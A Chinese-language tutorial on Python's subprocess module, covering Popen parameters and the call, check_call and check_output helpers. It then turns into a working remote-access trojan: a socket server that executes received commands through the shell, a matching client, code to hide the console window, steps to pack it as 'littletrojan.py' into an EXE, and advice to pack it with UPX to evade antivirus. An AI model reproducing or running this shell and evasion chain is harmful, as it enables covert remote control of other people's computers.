## subprocess

这是一个函数执行的库，类似与 os.system , os.popen , commands 等命令执行的语句或库。

这个库中就只有一个类 Popen

```
class Popen(args, bufsize=0, executable=None,
            stdin=None, stdout=None, stderr=None,
            preexec_fn=None, close_fds=False, shell=False,
            cwd=None, env=None, universal_newlines=False,
            startupinfo=None, creationflags=0):
```

|参数 					|含义																									|
|-----					|----																									|
|agrs					|需要被执行的字符串或数组																				|
|bufsize 				|0 无缓冲，1 有缓冲，其他正值 缓冲区大小，负值 采用默认系统缓冲(一般是全缓冲)							|
|executable 			|一般不用吧，args字符串或列表第一项表示程序名 															|
|stdin，stdout，stderr	|None 没有任何重定向，继承父进程，PIPE 创建管道，文件对象，文件描述符(整数)，stderr 还可以设置为 STDOUT	|
|preexec_fn 			|钩子函数， 在fork和exec之间执行。(unix) 																|
|close_fds				|unix 下执行新进程前是否关闭0/1/2之外的文件，windows下不继承还是继承父进程的文件描述符 					|
|shell 					|为真的话，unix下相当于args前面添加了 "/bin/sh“ ”-c”，window下，相当于添加"cmd.exe /c"					|
|cwd 					|设置工作目录																							|
|env 					|设置环境变量 																							|
|universal_newlines 	|各种换行符统一处理成 '\n' 																				|
|startupinfo 			|window下传递给CreateProcess的结构体 																	|
|creationflags 			|windows下，传递CREATE_NEW_CONSOLE创建自己的控制台窗口													|

shell默认为False，在Linux下，shell=False时, Popen调用os.execvp()执行args指定的程序；shell=True时，如果args是字符串，Popen直接调用系统的Shell来执行args指定的程序，如果args是一个序列，则args的第一项是定义程序命令字符串，其它项是调用系统Shell时的附加参数。

在Windows下，不论shell的值如何，Popen调用CreateProcess()执行args指定的外部程序。如果args是一个序列，则先用list2cmdline()转化为字符串，但需要注意的是，并不是MS Windows下所有的程序都可以用list2cmdline来转化为命令行字符串。

这个库有三个方法 call() , check_call() , check_output() ，其实也是在调用上面的那个类。

call() 执行程序，并等待它完成

```
def call(*popenargs, **kwargs):
    return Popen(*popenargs, **kwargs).wait()
```

check_call() 调用前面的call，如果返回值非零，则抛出异常

```
def check_call(*popenargs, **kwargs):
    retcode = call(*popenargs, **kwargs)
    if retcode:
        cmd = kwargs.get("args")
        raise CalledProcessError(retcode, cmd)
    return 0

```

check_output() 执行程序，返回子进程向标准输出的输出结果

```
def check_output(*popenargs, **kwargs):
    process = Popen(*popenargs, stdout=PIPE, **kwargs)
    output, unused_err = process.communicate()
    retcode = process.poll()
    if retcode:
        cmd = kwargs.get("args")
        raise CalledProcessError(retcode, cmd, output=output)
    return output
```

一个简单的的 shell 

```python
# coding=utf-8

import subprocess

def run_command(command):
    command = command.rstrip()
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
    except:
        output = 'Failed to execute command.\r\n'

    return output


if __name__ == '__main__':
	while 1:
		command = raw_input("$ ")
		if command == "exit" or command == "quit":
			break
		result = run_command(command)
		
		print result,
```

一个反弹 shell 

```
# coding=utf-8

import sys
import socket
import argparse
import threading
import subprocess

class TargetServer(object):

    def __init__(self, port):
        self.port = port
        self.host = socket.gethostname()
        self.server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        self.server.bind(("0.0.0.0",int(self.port)))
        self.server.listen(10)

    def run(self):
        while 1:
            client_socket,client_addr = self.server.accept()
            client_thread = threading.Thread(target=self.client_handler,args=(client_socket,))
            client_thread.start()

    def client_handler(self,client_socket):
        client_socket.sendall("<@ %s \$ >"%self.host)
        while 1:
            try:
                cmd_buffer = client_socket.recv(1024)
                response = self.run_command(cmd_buffer)
                if len(response) == 0:
                    response = "[Successful!]\n"
                client_socket.sendall(response)
            except Exception,e:
                # print e
                break

    def run_command(self,command):
        command = command.strip()
        try:
            output = subprocess.check_output(command , stderr=subprocess.STDOUT , shell=True)
        except:
            output = '[*]Failed to execute command ! \n'

        return output

class Client(object):

    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.client.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        
    def run(self):
        try:
            self.client.connect((self.host,int(self.port)))
            header = self.client.recv(4096)
            command = raw_input(header)
            if command == "exit" or command == "quit":
                self.clien.close()
                sys.exit(0)
            self.client.sendall(command)
            while 1:
                recv_len = 1
                response = ""

                while recv_len :
                    data = self.client.recv(4096)
                    recv_len = len(data)
                    response += data
                    if recv_len < 4096:
                        break

                print response,

                command = raw_input(header)
                if command == "exit" or command == "quit":
                    self.client.close()
                    break
                self.client.sendall(command)

        except:
            print "[*] Exception Failed ! \n"

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="NetCat Shell")
    parser.add_argument("-s","--server",help="Target Server",action="store_true")
    parser.add_argument("-c","--client",help="Client",action="store_true")
    parser.add_argument("--host",help="target host IP",action="store",default="127.0.0.1")
    parser.add_argument("port",help="target host port",action="store",type=int)
    args = parser.parse_args()
    port = args.port
    if args.server: 
        s = TargetServer(port)
        s.run()
    if args.client:
        host = args.host
        c = Client(host,port)
        c.run()
```

在服务器运行时，希望它隐藏 console 窗体，如果在 cmd 中执行则不会隐藏

```
import ctypes
#隐藏console窗体
def hiding():
   whnd = ctypes.windll.kernel32.GetConsoleWindow()
   if whnd != 0:
      ctypes.windll.user32.ShowWindow(whnd, 0)
      ctypes.windll.kernel32.CloseHandle(whnd)
```

用 py2exe 打包成 EXE 文件

```
#setup.py
from distutils.core import setup
import py2exe
 
setup(console=["littletrojan.py"])#此处为需要封装的python文件名
```

然后 

```
python setup.py py2exe
```

或者是用 pyinstaller

```
python pyinstaller.py -F -w littletrojan.py
```

最后还可以用 UPX Shell 给它加壳免杀

![upxshell](images/upxshell.png)